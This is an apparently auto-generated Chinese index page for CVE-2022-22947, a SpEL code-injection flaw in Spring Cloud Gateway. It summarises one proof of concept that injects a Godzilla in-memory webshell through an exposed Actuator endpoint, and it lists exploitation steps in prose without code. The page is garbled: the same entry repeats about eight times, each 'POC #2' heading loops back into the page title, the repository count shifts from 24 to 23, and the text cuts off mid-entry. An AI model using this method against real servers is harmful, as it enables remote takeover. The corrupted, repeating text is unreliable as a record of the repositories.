# CVE-2022-22947

> 📦 该CVE有 **24** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-22947-0730Nophone_CVE-2022-22947-.md](../2022/CVE-2022-22947-0730Nophone_CVE-2022-22947-.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。根据漏洞信息和搜索结果，当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的 POC 代码使用 `AddResponseHeader` 过滤器，通过 SpEL 表达式调用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法来动态定义一个名为 `ms.GMemShell` 的类，该类是一个哥斯拉内存马。然后，将该类注入到目标 JVM 中，从而实现远程代码执行。根据漏洞描述和相关资料，此方法是有效的。PoC 通过发送恶意构造的请求到 Gateway Actuator 端点来触发漏洞。

**投毒风险：**
虽然主要目的是注入内存马，但代码中存在一定的潜在投毒风险。内存马本身就是一种恶意行为，因为它允许攻击者在不修改磁盘文件的情况下执行任意代码。该内存马具体实现未完整提供，但从github链接可以知道是一个哥斯拉内存马，因此假设其功能为接收 base64 编码的恶意代码并执行。风险点分析：

*   **内存马本身：** 注入内存马已经具有极高的风险。
*   **未清除路由：**  README提到代码没有清除路由部分，如果攻击者不清除路由，可能会留下后门，方便后续访问。
*   **默认密钥：** 哥斯拉内存马默认存在密钥，攻击者使用默认密钥能够轻易控制目标系统。

虽然POC的主要目的是为了验证漏洞，但是内存马本身具有极高的危害性，因此判定存在一定投毒风险。

**利用方式：**

1.  **前提条件：**  目标 Spring Cloud Gateway 实例的 Gateway Actuator 端点已启用、公开且未受保护。
2.  **发送恶意请求：**  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，并将其发送到 Gateway Actuator 端点。该表达式利用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法动态定义一个哥斯拉内存马类 `ms.GMemShell`，该类会将恶意代码注入到服务器的内存中。
3.  **内存马激活：** 内存马被注入后，攻击者可以使用哥斯拉客户端与注入的内存马进行交互，发送指令。
4.  **远程代码执行：** 攻击者可以通过哥斯拉客户端执行任意代码，从而控制目标服务器。

**项目地址:** [0730Nophone/CVE-2022-22947-](https://github.com/0730Nophone/CVE-2022-22947-)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #2

**来源**: [CVE-2022-22947-4nNns_CVE-2022-22947.md](../2022/CVE-2022-22947-4nNns_CVE-2022-22947.md)

# CVE-2022-22947

> 📦 该CVE有 **24** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-22947-0730Nophone_CVE-2022-22947-.md](../2022/CVE-2022-22947-0730Nophone_CVE-2022-22947-.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。根据漏洞信息和搜索结果，当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的 POC 代码使用 `AddResponseHeader` 过滤器，通过 SpEL 表达式调用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法来动态定义一个名为 `ms.GMemShell` 的类，该类是一个哥斯拉内存马。然后，将该类注入到目标 JVM 中，从而实现远程代码执行。根据漏洞描述和相关资料，此方法是有效的。PoC 通过发送恶意构造的请求到 Gateway Actuator 端点来触发漏洞。

**投毒风险：**
虽然主要目的是注入内存马，但代码中存在一定的潜在投毒风险。内存马本身就是一种恶意行为，因为它允许攻击者在不修改磁盘文件的情况下执行任意代码。该内存马具体实现未完整提供，但从github链接可以知道是一个哥斯拉内存马，因此假设其功能为接收 base64 编码的恶意代码并执行。风险点分析：

*   **内存马本身：** 注入内存马已经具有极高的风险。
*   **未清除路由：**  README提到代码没有清除路由部分，如果攻击者不清除路由，可能会留下后门，方便后续访问。
*   **默认密钥：** 哥斯拉内存马默认存在密钥，攻击者使用默认密钥能够轻易控制目标系统。

虽然POC的主要目的是为了验证漏洞，但是内存马本身具有极高的危害性，因此判定存在一定投毒风险。

**利用方式：**

1.  **前提条件：**  目标 Spring Cloud Gateway 实例的 Gateway Actuator 端点已启用、公开且未受保护。
2.  **发送恶意请求：**  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，并将其发送到 Gateway Actuator 端点。该表达式利用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法动态定义一个哥斯拉内存马类 `ms.GMemShell`，该类会将恶意代码注入到服务器的内存中。
3.  **内存马激活：** 内存马被注入后，攻击者可以使用哥斯拉客户端与注入的内存马进行交互，发送指令。
4.  **远程代码执行：** 攻击者可以通过哥斯拉客户端执行任意代码，从而控制目标服务器。

**项目地址:** [0730Nophone/CVE-2022-22947-](https://github.com/0730Nophone/CVE-2022-22947-)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #2

**来源**: [CVE-2022-22947-4nNns_CVE-2022-22947.md](../2022/CVE-2022-22947-4nNns_CVE-2022-22947.md)

# CVE-2022-22947

> 📦 该CVE有 **24** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-22947-0730Nophone_CVE-2022-22947-.md](../2022/CVE-2022-22947-0730Nophone_CVE-2022-22947-.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。根据漏洞信息和搜索结果，当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的 POC 代码使用 `AddResponseHeader` 过滤器，通过 SpEL 表达式调用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法来动态定义一个名为 `ms.GMemShell` 的类，该类是一个哥斯拉内存马。然后，将该类注入到目标 JVM 中，从而实现远程代码执行。根据漏洞描述和相关资料，此方法是有效的。PoC 通过发送恶意构造的请求到 Gateway Actuator 端点来触发漏洞。

**投毒风险：**
虽然主要目的是注入内存马，但代码中存在一定的潜在投毒风险。内存马本身就是一种恶意行为，因为它允许攻击者在不修改磁盘文件的情况下执行任意代码。该内存马具体实现未完整提供，但从github链接可以知道是一个哥斯拉内存马，因此假设其功能为接收 base64 编码的恶意代码并执行。风险点分析：

*   **内存马本身：** 注入内存马已经具有极高的风险。
*   **未清除路由：**  README提到代码没有清除路由部分，如果攻击者不清除路由，可能会留下后门，方便后续访问。
*   **默认密钥：** 哥斯拉内存马默认存在密钥，攻击者使用默认密钥能够轻易控制目标系统。

虽然POC的主要目的是为了验证漏洞，但是内存马本身具有极高的危害性，因此判定存在一定投毒风险。

**利用方式：**

1.  **前提条件：**  目标 Spring Cloud Gateway 实例的 Gateway Actuator 端点已启用、公开且未受保护。
2.  **发送恶意请求：**  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，并将其发送到 Gateway Actuator 端点。该表达式利用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法动态定义一个哥斯拉内存马类 `ms.GMemShell`，该类会将恶意代码注入到服务器的内存中。
3.  **内存马激活：** 内存马被注入后，攻击者可以使用哥斯拉客户端与注入的内存马进行交互，发送指令。
4.  **远程代码执行：** 攻击者可以通过哥斯拉客户端执行任意代码，从而控制目标服务器。

**项目地址:** [0730Nophone/CVE-2022-22947-](https://github.com/0730Nophone/CVE-2022-22947-)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #2

**来源**: [CVE-2022-22947-4nNns_CVE-2022-22947.md](../2022/CVE-2022-22947-4nNns_CVE-2022-22947.md)

# CVE-2022-22947

> 📦 该CVE有 **24** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-22947-0730Nophone_CVE-2022-22947-.md](../2022/CVE-2022-22947-0730Nophone_CVE-2022-22947-.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。根据漏洞信息和搜索结果，当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的 POC 代码使用 `AddResponseHeader` 过滤器，通过 SpEL 表达式调用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法来动态定义一个名为 `ms.GMemShell` 的类，该类是一个哥斯拉内存马。然后，将该类注入到目标 JVM 中，从而实现远程代码执行。根据漏洞描述和相关资料，此方法是有效的。PoC 通过发送恶意构造的请求到 Gateway Actuator 端点来触发漏洞。

**投毒风险：**
虽然主要目的是注入内存马，但代码中存在一定的潜在投毒风险。内存马本身就是一种恶意行为，因为它允许攻击者在不修改磁盘文件的情况下执行任意代码。该内存马具体实现未完整提供，但从github链接可以知道是一个哥斯拉内存马，因此假设其功能为接收 base64 编码的恶意代码并执行。风险点分析：

*   **内存马本身：** 注入内存马已经具有极高的风险。
*   **未清除路由：**  README提到代码没有清除路由部分，如果攻击者不清除路由，可能会留下后门，方便后续访问。
*   **默认密钥：** 哥斯拉内存马默认存在密钥，攻击者使用默认密钥能够轻易控制目标系统。

虽然POC的主要目的是为了验证漏洞，但是内存马本身具有极高的危害性，因此判定存在一定投毒风险。

**利用方式：**

1.  **前提条件：**  目标 Spring Cloud Gateway 实例的 Gateway Actuator 端点已启用、公开且未受保护。
2.  **发送恶意请求：**  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，并将其发送到 Gateway Actuator 端点。该表达式利用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法动态定义一个哥斯拉内存马类 `ms.GMemShell`，该类会将恶意代码注入到服务器的内存中。
3.  **内存马激活：** 内存马被注入后，攻击者可以使用哥斯拉客户端与注入的内存马进行交互，发送指令。
4.  **远程代码执行：** 攻击者可以通过哥斯拉客户端执行任意代码，从而控制目标服务器。

**项目地址:** [0730Nophone/CVE-2022-22947-](https://github.com/0730Nophone/CVE-2022-22947-)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #2

**来源**: [CVE-2022-22947-4nNns_CVE-2022-22947.md](../2022/CVE-2022-22947-4nNns_CVE-2022-22947.md)

# CVE-2022-22947

> 📦 该CVE有 **24** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-22947-0730Nophone_CVE-2022-22947-.md](../2022/CVE-2022-22947-0730Nophone_CVE-2022-22947-.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。根据漏洞信息和搜索结果，当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的 POC 代码使用 `AddResponseHeader` 过滤器，通过 SpEL 表达式调用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法来动态定义一个名为 `ms.GMemShell` 的类，该类是一个哥斯拉内存马。然后，将该类注入到目标 JVM 中，从而实现远程代码执行。根据漏洞描述和相关资料，此方法是有效的。PoC 通过发送恶意构造的请求到 Gateway Actuator 端点来触发漏洞。

**投毒风险：**
虽然主要目的是注入内存马，但代码中存在一定的潜在投毒风险。内存马本身就是一种恶意行为，因为它允许攻击者在不修改磁盘文件的情况下执行任意代码。该内存马具体实现未完整提供，但从github链接可以知道是一个哥斯拉内存马，因此假设其功能为接收 base64 编码的恶意代码并执行。风险点分析：

*   **内存马本身：** 注入内存马已经具有极高的风险。
*   **未清除路由：**  README提到代码没有清除路由部分，如果攻击者不清除路由，可能会留下后门，方便后续访问。
*   **默认密钥：** 哥斯拉内存马默认存在密钥，攻击者使用默认密钥能够轻易控制目标系统。

虽然POC的主要目的是为了验证漏洞，但是内存马本身具有极高的危害性，因此判定存在一定投毒风险。

**利用方式：**

1.  **前提条件：**  目标 Spring Cloud Gateway 实例的 Gateway Actuator 端点已启用、公开且未受保护。
2.  **发送恶意请求：**  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，并将其发送到 Gateway Actuator 端点。该表达式利用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法动态定义一个哥斯拉内存马类 `ms.GMemShell`，该类会将恶意代码注入到服务器的内存中。
3.  **内存马激活：** 内存马被注入后，攻击者可以使用哥斯拉客户端与注入的内存马进行交互，发送指令。
4.  **远程代码执行：** 攻击者可以通过哥斯拉客户端执行任意代码，从而控制目标服务器。

**项目地址:** [0730Nophone/CVE-2022-22947-](https://github.com/0730Nophone/CVE-2022-22947-)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #2

**来源**: [CVE-2022-22947-4nNns_CVE-2022-22947.md](../2022/CVE-2022-22947-4nNns_CVE-2022-22947.md)

# CVE-2022-22947

> 📦 该CVE有 **24** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-22947-0730Nophone_CVE-2022-22947-.md](../2022/CVE-2022-22947-0730Nophone_CVE-2022-22947-.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。根据漏洞信息和搜索结果，当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的 POC 代码使用 `AddResponseHeader` 过滤器，通过 SpEL 表达式调用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法来动态定义一个名为 `ms.GMemShell` 的类，该类是一个哥斯拉内存马。然后，将该类注入到目标 JVM 中，从而实现远程代码执行。根据漏洞描述和相关资料，此方法是有效的。PoC 通过发送恶意构造的请求到 Gateway Actuator 端点来触发漏洞。

**投毒风险：**
虽然主要目的是注入内存马，但代码中存在一定的潜在投毒风险。内存马本身就是一种恶意行为，因为它允许攻击者在不修改磁盘文件的情况下执行任意代码。该内存马具体实现未完整提供，但从github链接可以知道是一个哥斯拉内存马，因此假设其功能为接收 base64 编码的恶意代码并执行。风险点分析：

*   **内存马本身：** 注入内存马已经具有极高的风险。
*   **未清除路由：**  README提到代码没有清除路由部分，如果攻击者不清除路由，可能会留下后门，方便后续访问。
*   **默认密钥：** 哥斯拉内存马默认存在密钥，攻击者使用默认密钥能够轻易控制目标系统。

虽然POC的主要目的是为了验证漏洞，但是内存马本身具有极高的危害性，因此判定存在一定投毒风险。

**利用方式：**

1.  **前提条件：**  目标 Spring Cloud Gateway 实例的 Gateway Actuator 端点已启用、公开且未受保护。
2.  **发送恶意请求：**  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，并将其发送到 Gateway Actuator 端点。该表达式利用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法动态定义一个哥斯拉内存马类 `ms.GMemShell`，该类会将恶意代码注入到服务器的内存中。
3.  **内存马激活：** 内存马被注入后，攻击者可以使用哥斯拉客户端与注入的内存马进行交互，发送指令。
4.  **远程代码执行：** 攻击者可以通过哥斯拉客户端执行任意代码，从而控制目标服务器。

**项目地址:** [0730Nophone/CVE-2022-22947-](https://github.com/0730Nophone/CVE-2022-22947-)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #2

**来源**: [CVE-2022-22947-4nNns_CVE-2022-22947.md](../2022/CVE-2022-22947-4nNns_CVE-2022-22947.md)

# CVE-2022-22947

> 📦 该CVE有 **24** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-22947-0730Nophone_CVE-2022-22947-.md](../2022/CVE-2022-22947-0730Nophone_CVE-2022-22947-.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。根据漏洞信息和搜索结果，当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的 POC 代码使用 `AddResponseHeader` 过滤器，通过 SpEL 表达式调用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法来动态定义一个名为 `ms.GMemShell` 的类，该类是一个哥斯拉内存马。然后，将该类注入到目标 JVM 中，从而实现远程代码执行。根据漏洞描述和相关资料，此方法是有效的。PoC 通过发送恶意构造的请求到 Gateway Actuator 端点来触发漏洞。

**投毒风险：**
虽然主要目的是注入内存马，但代码中存在一定的潜在投毒风险。内存马本身就是一种恶意行为，因为它允许攻击者在不修改磁盘文件的情况下执行任意代码。该内存马具体实现未完整提供，但从github链接可以知道是一个哥斯拉内存马，因此假设其功能为接收 base64 编码的恶意代码并执行。风险点分析：

*   **内存马本身：** 注入内存马已经具有极高的风险。
*   **未清除路由：**  README提到代码没有清除路由部分，如果攻击者不清除路由，可能会留下后门，方便后续访问。
*   **默认密钥：** 哥斯拉内存马默认存在密钥，攻击者使用默认密钥能够轻易控制目标系统。

虽然POC的主要目的是为了验证漏洞，但是内存马本身具有极高的危害性，因此判定存在一定投毒风险。

**利用方式：**

1.  **前提条件：**  目标 Spring Cloud Gateway 实例的 Gateway Actuator 端点已启用、公开且未受保护。
2.  **发送恶意请求：**  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，并将其发送到 Gateway Actuator 端点。该表达式利用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法动态定义一个哥斯拉内存马类 `ms.GMemShell`，该类会将恶意代码注入到服务器的内存中。
3.  **内存马激活：** 内存马被注入后，攻击者可以使用哥斯拉客户端与注入的内存马进行交互，发送指令。
4.  **远程代码执行：** 攻击者可以通过哥斯拉客户端执行任意代码，从而控制目标服务器。

**项目地址:** [0730Nophone/CVE-2022-22947-](https://github.com/0730Nophone/CVE-2022-22947-)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #2

**来源**: [CVE-2022-22947-4nNns_CVE-2022-22947.md](../2022/CVE-2022-22947-4nNns_CVE-2022-22947.md)

# CVE-2022-22947

> 📦 该CVE有 **24** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-22947-0730Nophone_CVE-2022-22947-.md](../2022/CVE-2022-22947-0730Nophone_CVE-2022-22947-.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。根据漏洞信息和搜索结果，当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的 POC 代码使用 `AddResponseHeader` 过滤器，通过 SpEL 表达式调用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法来动态定义一个名为 `ms.GMemShell` 的类，该类是一个哥斯拉内存马。然后，将该类注入到目标 JVM 中，从而实现远程代码执行。根据漏洞描述和相关资料，此方法是有效的。PoC 通过发送恶意构造的请求到 Gateway Actuator 端点来触发漏洞。

**投毒风险：**
虽然主要目的是注入内存马，但代码中存在一定的潜在投毒风险。内存马本身就是一种恶意行为，因为它允许攻击者在不修改磁盘文件的情况下执行任意代码。该内存马具体实现未完整提供，但从github链接可以知道是一个哥斯拉内存马，因此假设其功能为接收 base64 编码的恶意代码并执行。风险点分析：

*   **内存马本身：** 注入内存马已经具有极高的风险。
*   **未清除路由：**  README提到代码没有清除路由部分，如果攻击者不清除路由，可能会留下后门，方便后续访问。
*   **默认密钥：** 哥斯拉内存马默认存在密钥，攻击者使用默认密钥能够轻易控制目标系统。

虽然POC的主要目的是为了验证漏洞，但是内存马本身具有极高的危害性，因此判定存在一定投毒风险。

**利用方式：**

1.  **前提条件：**  目标 Spring Cloud Gateway 实例的 Gateway Actuator 端点已启用、公开且未受保护。
2.  **发送恶意请求：**  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，并将其发送到 Gateway Actuator 端点。该表达式利用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法动态定义一个哥斯拉内存马类 `ms.GMemShell`，该类会将恶意代码注入到服务器的内存中。
3.  **内存马激活：** 内存马被注入后，攻击者可以使用哥斯拉客户端与注入的内存马进行交互，发送指令。
4.  **远程代码执行：** 攻击者可以通过哥斯拉客户端执行任意代码，从而控制目标服务器。

**项目地址:** [0730Nophone/CVE-2022-22947-](https://github.com/0730Nophone/CVE-2022-22947-)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #2

**来源**: [CVE-2022-22947-4nNns_CVE-2022-22947.md](../2022/CVE-2022-22947-4nNns_CVE-2022-22947.md)

# CVE-2022-22947

> 📦 该CVE有 **24** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-22947-0730Nophone_CVE-2022-22947-.md](../2022/CVE-2022-22947-0730Nophone_CVE-2022-22947-.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。根据漏洞信息和搜索结果，当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的 POC 代码使用 `AddResponseHeader` 过滤器，通过 SpEL 表达式调用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法来动态定义一个名为 `ms.GMemShell` 的类，该类是一个哥斯拉内存马。然后，将该类注入到目标 JVM 中，从而实现远程代码执行。根据漏洞描述和相关资料，此方法是有效的。PoC 通过发送恶意构造的请求到 Gateway Actuator 端点来触发漏洞。

**投毒风险：**
虽然主要目的是注入内存马，但代码中存在一定的潜在投毒风险。内存马本身就是一种恶意行为，因为它允许攻击者在不修改磁盘文件的情况下执行任意代码。该内存马具体实现未完整提供，但从github链接可以知道是一个哥斯拉内存马，因此假设其功能为接收 base64 编码的恶意代码并执行。风险点分析：

*   **内存马本身：** 注入内存马已经具有极高的风险。
*   **未清除路由：**  README提到代码没有清除路由部分，如果攻击者不清除路由，可能会留下后门，方便后续访问。
*   **默认密钥：** 哥斯拉内存马默认存在密钥，攻击者使用默认密钥能够轻易控制目标系统。

虽然POC的主要目的是为了验证漏洞，但是内存马本身具有极高的危害性，因此判定存在一定投毒风险。

**利用方式：**

1.  **前提条件：**  目标 Spring Cloud Gateway 实例的 Gateway Actuator 端点已启用、公开且未受保护。
2.  **发送恶意请求：**  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，并将其发送到 Gateway Actuator 端点。该表达式利用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法动态定义一个哥斯拉内存马类 `ms.GMemShell`，该类会将恶意代码注入到服务器的内存中。
3.  **内存马激活：** 内存马被注入后，攻击者可以使用哥斯拉客户端与注入的内存马进行交互，发送指令。
4.  **远程代码执行：** 攻击者可以通过哥斯拉客户端执行任意代码，从而控制目标服务器。

**项目地址:** [0730Nophone/CVE-2022-22947-](https://github.com/0730Nophone/CVE-2022-22947-)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #2

**来源**: [CVE-2022-22947-4nNns_CVE-2022-22947.md](../2022/CVE-2022-22947-4nNns_CVE-2022-22947.md)

# CVE-2022-22947

> 📦 该CVE有 **24** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-22947-0730Nophone_CVE-2022-22947-.md](../2022/CVE-2022-22947-0730Nophone_CVE-2022-22947-.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。根据漏洞信息和搜索结果，当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的 POC 代码使用 `AddResponseHeader` 过滤器，通过 SpEL 表达式调用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法来动态定义一个名为 `ms.GMemShell` 的类，该类是一个哥斯拉内存马。然后，将该类注入到目标 JVM 中，从而实现远程代码执行。根据漏洞描述和相关资料，此方法是有效的。PoC 通过发送恶意构造的请求到 Gateway Actuator 端点来触发漏洞。

**投毒风险：**
虽然主要目的是注入内存马，但代码中存在一定的潜在投毒风险。内存马本身就是一种恶意行为，因为它允许攻击者在不修改磁盘文件的情况下执行任意代码。该内存马具体实现未完整提供，但从github链接可以知道是一个哥斯拉内存马，因此假设其功能为接收 base64 编码的恶意代码并执行。风险点分析：

*   **内存马本身：** 注入内存马已经具有极高的风险。
*   **未清除路由：**  README提到代码没有清除路由部分，如果攻击者不清除路由，可能会留下后门，方便后续访问。
*   **默认密钥：** 哥斯拉内存马默认存在密钥，攻击者使用默认密钥能够轻易控制目标系统。

虽然POC的主要目的是为了验证漏洞，但是内存马本身具有极高的危害性，因此判定存在一定投毒风险。

**利用方式：**

1.  **前提条件：**  目标 Spring Cloud Gateway 实例的 Gateway Actuator 端点已启用、公开且未受保护。
2.  **发送恶意请求：**  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，并将其发送到 Gateway Actuator 端点。该表达式利用 `org.springframework.cglib.core.ReflectUtils.defineClass` 方法动态定义一个哥斯拉内存马类 `ms.GMemShell`，该类会将恶意代码注入到服务器的内存中。
3.  **内存马激活：** 内存马被注入后，攻击者可以使用哥斯拉客户端与注入的内存马进行交互，发送指令。
4.  **远程代码执行：** 攻击者可以通过哥斯拉客户端执行任意代码，从而控制目标服务器。

**项目地址:** [0730Nophone/CVE-2022-22947-](https://github.com/0730Nophone/CVE-2022-22947-)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #2

**来源**: [CVE-2022-22947-4nNns_CVE-2022-22947.md](../2022/CVE-2022-22947-4nNns_CVE-2022-22947.md)

# CVE-2022-22947

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-22947-0730Nophone_CVE-2022-22947-.md](../2022/CVE-2022-22947-0730Nophone_CVE-2022-22947-.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

